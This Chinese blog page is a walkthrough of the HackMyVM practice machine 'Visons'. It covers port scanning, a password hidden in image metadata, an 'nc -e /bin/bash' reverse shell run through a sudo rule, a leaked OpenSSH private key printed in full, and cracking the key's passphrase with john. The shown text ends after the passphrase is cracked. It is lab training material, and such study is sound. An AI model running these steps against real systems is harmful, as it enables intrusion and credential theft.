@@ -1,0 +1,621 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-Visons | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-Visons 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# nmap 192.168.161.210 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-07 09:55 EDT Nmap scan report for 192.168.161.210 H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Visons">
+<meta property="og:url" content="https://drume2.github.io/posts/3a9f7279.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="HMV-Visons 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# nmap 192.168.161.210 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-07 09:55 EDT Nmap scan report for 192.168.161.210 H">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/27.webp">
+<meta property="article:published_time" content="2025-07-07T14:27:59.000Z">
+<meta property="article:modified_time" content="2025-07-07T15:56:07.398Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/27.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/3a9f7279"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HMV-Visons',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-07 23:56:07'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/27.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-Visons</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-07T14:27:59.000Z" title="发表于 2025-07-07 22:27:59">2025-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-07T15:56:07.398Z" title="更新于 2025-07-07 23:56:07">2025-07-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-Visons"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HMV-Visons"><a href="#HMV-Visons" class="headerlink" title="HMV-Visons"></a>HMV-Visons</h1><p><img src="/posts/3a9f7279/image-20250707223518260.png" alt="image-20250707223518260"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# nmap 192.168.161.210
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-07 09:55 EDT
+Nmap scan report for 192.168.161.210
+Host is up (0.0028s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22&#x2F;tcp open  ssh
+80&#x2F;tcp open  http
+MAC Address: 08:00:27:D0:9A:39 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# nmap 192.168.161.210 -A
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-07 11:12 EDT
+Nmap scan report for 192.168.161.210
+Host is up (0.0012s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
+|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
+|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
+80&#x2F;tcp open  http    nginx 1.14.2
+|_http-title: Site doesn&#39;t have a title (text&#x2F;html).
+|_http-server-header: nginx&#x2F;1.14.2
+MAC Address: 08:00:27:D0:9A:39 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.16 ms 192.168.161.210
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>靶机开放了22和80两个端口</p>
+<h3 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h3><p><img src="/posts/3a9f7279/image-20250707232013364.png" alt="image-20250707232013364"></p>
+<p>F12发现了一个图片和用户名alicia</p>
+<p>将图片拿到本地，用exiftool进行查看图片内容</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# wget 192.168.161.210&#x2F;white.png
+--2025-07-07 09:56:31--  http:&#x2F;&#x2F;192.168.161.210&#x2F;white.png
+Connecting to 192.168.161.210:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 12655 (12K) [image&#x2F;png]
+Saving to: ‘white.png’
+
+white.png                                    100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  12.36K  --.-KB&#x2F;s    in 0s
+
+2025-07-07 09:56:31 (375 MB&#x2F;s) - ‘white.png’ saved [12655&#x2F;12655]
+
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# exiftool white.png
+ExifTool Version Number         : 13.10
+File Name                       : white.png
+Directory                       : .
+File Size                       : 13 kB
+File Modification Date&#x2F;Time     : 2021:04:19 05:05:04-04:00
+File Access Date&#x2F;Time           : 2025:07:07 09:56:31-04:00
+File Inode Change Date&#x2F;Time     : 2025:07:07 09:56:31-04:00
+File Permissions                : -rw-rw-r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image&#x2F;png
+Image Width                     : 1920
+Image Height                    : 1080
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate&#x2F;Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Background Color                : 255 255 255
+Pixels Per Unit X               : 11811
+Pixels Per Unit Y               : 11811
+Pixel Units                     : meters
+Modify Date                     : 2021:04:19 08:26:43
+Comment                         : pw:ihaveadream
+Image Size                      : 1920x1080
+Megapixels                      : 2.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到了密码，跟alicia进行联系，猜测是ssh登陆的凭证</p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ssh alicia@192.168.161.210
+The authenticity of host &#39;192.168.161.210 (192.168.161.210)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:bygz7T6Gfa+JkC+fYDCq3G3A&#x2F;WbnZLNIOtkpFpo0R6E.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes
+Warning: Permanently added &#39;192.168.161.210&#39; (ED25519) to the list of known hosts.
+alicia@192.168.161.210&#39;s password:
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+alicia@visions:~$ id
+uid&#x3D;1001(alicia) gid&#x3D;1001(alicia) groups&#x3D;1001(alicia)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>并没有在这个用户下发现什么有用的信息</p>
+<p>查看home目录下有几个用户</p>
+<pre class="line-numbers language-none"><code class="language-none">alicia@visions:&#x2F;home$ ls
+alicia  emma  isabella  sophia<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>存在着四个用户</p>
+<p>先查看当前用户有没有sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">alicia@visions:&#x2F;home&#x2F;emma$ sudo -l
+Matching Defaults entries for alicia on visions:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User alicia may run the following commands on visions:
+    (emma) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以以emma的身份执行nc命令，尝试将shell反弹一下</p>
+<h3 id="切换到emma"><a href="#切换到emma" class="headerlink" title="切换到emma"></a>切换到emma</h3><pre class="line-numbers language-none"><code class="language-none">alicia@visions:&#x2F;home$ sudo -u emma &#x2F;usr&#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 192.168.161.76 1234
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.161.76] from (UNKNOWN) [192.168.161.210] 58272
+&#x2F;usr&#x2F;bin&#x2F;script -qc &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;null
+emma@visions:&#x2F;home$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个用户下有一个note.txt文件</p>
+<pre class="line-numbers language-none"><code class="language-none">emma@visions:~$ cat note.txt
+cat note.txt
+I cant help myself.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>发现没什么用，猜测图片还有信息没有显示出来，看到是png结尾的图片，拿stegsolve进行查看</p>
+<p><img src="/posts/3a9f7279/image-20250707232417932.png" alt="image-20250707232417932"></p>
+<p>这里得到了sophia用户的密码，拿去进行切换</p>
+<h3 id="切换到sophia"><a href="#切换到sophia" class="headerlink" title="切换到sophia"></a>切换到sophia</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# ssh sophia@192.168.161.210
+sophia@192.168.161.210&#39;s password:
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+sophia@visions:~$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在这个用户下发现了userflag</p>
+<h3 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h3><pre class="line-numbers language-none"><code class="language-none">sophia@visions:~$ cat user.txt
+hmvicanseeforever
+sophia@visions:~$ ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>接着查看提权方案</p>
+<pre class="line-numbers language-none"><code class="language-none">sophia@visions:~$ sudo -l
+Matching Defaults entries for sophia on visions:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User sophia may run the following commands on visions:
+    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;cat &#x2F;home&#x2F;isabella&#x2F;.invisible<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以读取isablella用户下的invisible文件，尝试读取一下</p>
+<pre class="line-numbers language-none"><code class="language-none">sophia@visions:~$ sudo &#x2F;usr&#x2F;bin&#x2F;cat &#x2F;home&#x2F;isabella&#x2F;.invisible
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
+1sMQAToGnurcIWAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDNAxlJldzm
+IgVNFXbjg51CS4YEuIxM5gQxjafNJ&#x2F;rzYw0sOPkT9sL6dYasQcOHX1SYxk5E+qD8QNZQPZ
+GfACdWDLwOcI4LLME0BOjARwmrpU4mJXwugX4+RbGICFMgY8ZYtKXEIoF8dwKPVsBdoIwi
+lgHyfJD4LwkqfV6mvlau+XRZZBhvlNP10F0SAAZqBaA9y7hRWJO&#x2F;XcCZC6HzJKzloAL2Xw
+GvAMzgtPH&#x2F;wj06NoOFjmVGMfmmHzCwgc+fLOeXXYzFeRNPH3cVExc+BnB8Ju6CFa6n7VBV
+HLCYJ3CcgKnxv6OwVtkoDi0UEFUOefELQV7fZ+g1sZt&#x2F;+2XPsmcZAAAD0E8RIvVF4XlKJq
+INtHdJ5QJZCuq2ufynbPNiHF53PqSlmC&#x2F;&#x2F;OkQZMWgJ5DcbzMJ92IqxRgjilZZUOUbE&#x2F;SFI
+PViwmpRWIGAhlyoPXyV513ukhb4UngYlgCP9qC4Rbn+Tp9Fv7lnAoD0DsmwITM2e&#x2F;Z65AD
+&#x2F;i&#x2F;BqrJ6scNEN0q+qNr3zOVljMZx+qy8cbuDn9Tbq2&#x2F;N+mcoEysfjfOaoJIgVJnLx1XE6r
++Y9UcRyPAYs+5TB1Nz&#x2F;fpnBo7vesOu5XLUqCBCphFGmdMCdSGYZAweitjQ+Mq36hQmCtSs
+Dwcbjg8vy5LJ+mtJXA7QhqgAfXWnLLny4NeCztUnTG0NLjbLR6M5e+HSsi2EqDYoGNpWld
+l4YzVPQoFMIaUJOGTc+VfkMWbQhzpiu66&#x2F;Du8dwhC+p6QSmwhV&#x2F;M70eWaH2ZVjK3MThg9K
+CVugFsLxioqlp&#x2F;rnE1oq7apTBX6FOjwz0ne+ytTVOQrHuPTs2QL4PlCvhPRoIuqydleFs4
+rdtzE6b46PexXlupewywiO5AVzbfSRAlCYwiwV42xGpYsNcKhdUY+Q9d9i9yudjIFoicrA
+MG9hxr7&#x2F;DJqEY311kTglDEHqQB3faErYsYPiOL9TTZWnPLZhClrPbiWST5tmMWxgNE&#x2F;AKY
+R7mKGDBOMFPlBAjGuKqR6zk5DEc3RzJnvGjUlaT3zzdVmxD8SpWtjzS6xHaSw&#x2F;WOvB0lsg
+Dhf+Gc7OWyHm2qk+OMK9t0&#x2F;lbIDfn3su0EHwbPjYTT3xk7CtG4AwiSqPve1t9bOdzD9w9r
+TM7am&#x2F;2i&#x2F;BV1uv28823pCuYZmNG7hu5InzNC&#x2F;3iTROraE31Qqe3JCNwxVDcHqb8s6gTN+J
+q6OyZdvNNiVQUo1l7hNUlg4he4q1kTwoyAATa0hPKVxEFEISRtaQln5Ni8V+fos8GTqgAr
+HH2LpFa4qZKTtUEU0f54ixjFL7Lkz6owbUG7Cy+LuGDI1aKJRGCZwd5LkStcF&#x2F;MAO3pulc
+MsHiYwmXT3lNHhkAd1h05N2yBzXaH+M3sX6IpNtq+gi+9F443Enk7FBRFLzxdJ+UT40f6E
++gyA2nBGygNhvQHXcu36A8BoE+IF7YVpdfDmYJffbTujtBUj2vrdsqVvtGUxf0vj9&#x2F;Sv+J
+HN9Yk2giXN8VX7qhcyLzUktmdfgd6JNAx+&#x2F;P7Kh3HV5oWk1Da+VJS+wtCg&#x2F;oEVSVyrEOpe
+skV8zcwd+ErNODEHTUbD&#x2F;nDARX8GeV158RMtRdZ5CJZSFjBz2oPDPDVpZMFNhENAAwPnrJ
+KD&#x2F;C2J6CKylbopifizfpEkmVqJRms&#x3D;
+-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>是一个id_rsa文件，拿去登录尝试</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ssh isabella@192.168.161.210 -i id
+Enter passphrase for key &#39;id&#39;:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>提示需要密码，接着爆破密码</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ssh2john id &gt; tmp
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# john tmp --wordlist&#x3D;&#x2F;home&#x2F;kali&#x2F;bash&#x2F;rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH 32&#x2F;64])
+Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+invisible        (id)
+1g 0:00:10:49 DONE (2025-07-07 10:19) 0.001538g&#x2F;s 17.38p&#x2F;s 17.38c&#x2F;s 17.38C&#x2F;s merda..damnyou
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>爆破得到密码为invisible，进行登录</p>
